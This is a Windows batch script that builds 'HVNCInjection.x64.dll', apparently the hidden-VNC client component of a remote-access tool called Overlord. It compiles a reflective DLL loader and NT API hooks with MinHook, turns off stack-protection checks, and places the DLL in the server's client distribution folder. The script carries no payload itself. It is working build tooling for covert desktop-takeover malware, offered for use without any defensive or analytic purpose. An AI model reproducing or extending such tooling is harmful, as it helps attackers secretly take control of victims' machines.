@echo off
setlocal
REM Build HVNCInjection DLL for Windows x64 using Visual Studio (cl.exe)
REM Run from VS Developer Command Prompt, or let the script detect vcvarsall.

set ROOT=%~dp0
set SRC_DIR=%ROOT%HVNCInjection\src
set OUT_DIR=%ROOT%Overlord-Server\dist-clients

REM Try to set up MSVC environment if cl.exe is not available
where cl.exe >nul 2>&1
if %ERRORLEVEL% neq 0 (
    echo cl.exe not found, searching for Visual Studio ...
    set "FOUND_VS="
    for /f "usebackq tokens=*" %%i in (`"%ProgramFiles(x86)%\Microsoft Visual Studio\Installer\vswhere.exe" -latest -products * -requires Microsoft.VisualStudio.Component.VC.Tools.x86.x64 -property installationPath 2^>nul`) do (
        set "VS_PATH=%%i"
        set "FOUND_VS=1"
    )
    if not defined FOUND_VS (
        echo ERROR: Visual Studio with C++ tools not found.
        echo Please run this from a VS Developer Command Prompt.
        exit /b 1
    )
    echo Found VS at: %VS_PATH%
    call "%VS_PATH%\VC\Auxiliary\Build\vcvarsall.bat" x64
)

if not exist "%OUT_DIR%" mkdir "%OUT_DIR%"

set DEFS=/DWIN64 /DNDEBUG /D_WINDOWS /D_USRDLL /DHVNCInjection_EXPORTS /DWIN_X64
set DEFS=%DEFS% /DREFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR
set DEFS=%DEFS% /DREFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN

set CFLAGS=/O2 /Oi /GL /MT /GS- /W3 /TC %DEFS% /I "%SRC_DIR%"

echo Compiling ReflectiveLoader.c ...
cl.exe /c %CFLAGS% /Fo"%SRC_DIR%\ReflectiveLoader.obj" "%SRC_DIR%\ReflectiveLoader.c"
if %ERRORLEVEL% neq 0 goto :error

echo Compiling ReflectiveDll.c ...
cl.exe /c %CFLAGS% /TP /Fo"%SRC_DIR%\ReflectiveDll.obj" "%SRC_DIR%\ReflectiveDll.c"
if %ERRORLEVEL% neq 0 goto :error

echo Compiling NtApiHooks.c ...
cl.exe /c %CFLAGS% /TP /Fo"%SRC_DIR%\NtApiHooks.obj" "%SRC_DIR%\NtApiHooks.c"
if %ERRORLEVEL% neq 0 goto :error

echo Linking HVNCInjection.x64.dll ...
link.exe /DLL /OUT:"%OUT_DIR%\HVNCInjection.x64.dll" ^
    /SUBSYSTEM:WINDOWS /OPT:REF /OPT:ICF /MACHINE:X64 ^
    /LIBPATH:"%SRC_DIR%" ^
    "%SRC_DIR%\ReflectiveLoader.obj" ^
    "%SRC_DIR%\ReflectiveDll.obj" ^
    "%SRC_DIR%\NtApiHooks.obj" ^
    libMinHook.x64.lib kernel32.lib user32.lib advapi32.lib ntdll.lib
if %ERRORLEVEL% neq 0 goto :error

echo.
echo Built: %OUT_DIR%\HVNCInjection.x64.dll
dir "%OUT_DIR%\HVNCInjection.x64.dll"

REM Clean up
del /q "%SRC_DIR%\*.obj" 2>nul

echo Done.
exit /b 0

:error
echo.
echo BUILD FAILED
exit /b 1
